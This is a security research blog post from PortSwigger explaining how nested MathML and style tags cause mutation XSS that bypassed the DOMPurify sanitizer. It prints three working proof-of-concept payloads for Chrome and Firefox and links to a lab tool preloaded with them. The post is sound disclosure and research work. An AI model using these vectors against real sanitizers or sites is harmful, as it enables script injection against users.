---
source: portswigger-research
source_url: https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss
title: "Bypassing DOMPurify again with mutation XSS | PortSwigger Research"
published: 2020-10-07T14:17:50
description: "After seeing Michał Bentkowski's DOMPurify bypass and the resulting patch, I was inspired to try and crack the patched version myself. Looking at his vector I saw he used style with math based tags to"
---

# Bypassing DOMPurify again with mutation XSS

![Gareth Heyes](https://portswigger.net/content/images/profiles/callout_gareth_heyes_114px.png)

### [Gareth Heyes](https://portswigger.net/research/gareth-heyes)

Researcher

[@garethheyes](https://twitter.com/garethheyes)

- **Published:** Wednesday, 7 October 2020 at 14:17 UTC

- **Updated:** Wednesday, 7 October 2020 at 15:02 UTC


After seeing [Michał Bentkowski's](https://twitter.com/SecurityMB) [DOMPurify bypass](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/) and the resulting patch, I was inspired to try and crack the patched version myself. Looking at his vector I saw he used style with math based tags to confuse the HTML parser and bypass DOMPurify. I wondered if we could take it a step further and create mXSS. DOMPurify's patch for Michal's finding worked by looking for potential mutation inside text nodes but crucially didn't take into account comments. I injected a comment and a HTML img tag with a title attribute, then I encoded the closing HTML comment and a further image that contained a XSS vector:

`<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">`

This bypassed DOMPurify! The following graphic explains how this was possible:

![A diagram showing how the mXSS vector works](https://portswigger.net/cms/images/8b/13/4a59-article-mxss-vector-explained.png)

This vector only worked in Chrome, so I was about to tweet this but then right before the tweet was scheduled to go out I found an mXSS in Firefox! For some reason a normal HTML comment wouldn't work to cause mutation in Firefox. However, if you change the comment to a CDATA tag it works fine:

`<math><mtext><table><mglyph><style><![CDATA[</style><img title="]]&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">`

The main difference between this and the Chrome one is CDATA tag and the required closing mglyph tag. I use the entity &Tab; to prove the mutation is actually happening and is not just attribute injection. It's worth noting that this Firefox vector was found after DOMPurify was patched. If you'd like to play with the vectors yourself then you can use our mXSS tool:

[Chrome mXSS vector](https://portswigger-labs.net/mxss/?input=%3Cmath%3E%3Cmtext%3E%3Ctable%3E%3Cmglyph%3E%3Cstyle%3E%3C!--%3C/style%3E%3Cimg%20title=%22--%26gt;%26lt;img%20src=1%20onerror=alert(1)%26gt;%22%3E)

[Firefox mXSS vector](https://portswigger-labs.net/mxss/?input=%3Cmath%3E%3Cmtext%3E%3Ctable%3E%3Cmglyph%3E%3Cstyle%3E%3C![CDATA[%3C/style%3E%3Cimg%20title=%22]]%26gt;%26lt;/mglyph%26gt;%26lt;img%26Tab;src=1%26Tab;onerror=alert(1)%26gt;%22%3E)

### Update...

When I first tried the Firefox vector the HTML comment didn't work. I tried it again after I published the post and it worked. Maybe when I originally tried I had a different vector. Anyway this will work in Firefox too:

`<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">`

I disclosed the Chrome vector to Cure53 and it was patched in DOMPurify version 2.1. However this mutation remains in both browsers, and may come in useful when attempting to bypass a HTML filter.

Happy hunting.

[XSS](https://portswigger.net/research/cross-site-scripting-research) [mXSS](https://portswigger.net/research/mxss)

[Back to all articles](https://portswigger.net/research/articles)

## Related Research

[**Cookie Chaos: How to bypass \_\_Host and \_\_Secure cookie prefixes** 03 September 2025Cookie Chaos: How to bypass \_\_Host and \_\_Secure cookie prefixes](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes) [**Stealing HttpOnly cookies with the cookie sandwich technique** 22 January 2025Stealing HttpOnly cookies with the cookie sandwich technique](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) [**Bypassing WAFs with the phantom $Version cookie** 04 December 2024Bypassing WAFs with the phantom $Version cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie) [**Concealing payloads in URL credentials** 23 October 2024Concealing payloads in URL credentials](https://portswigger.net/research/concealing-payloads-in-url-credentials)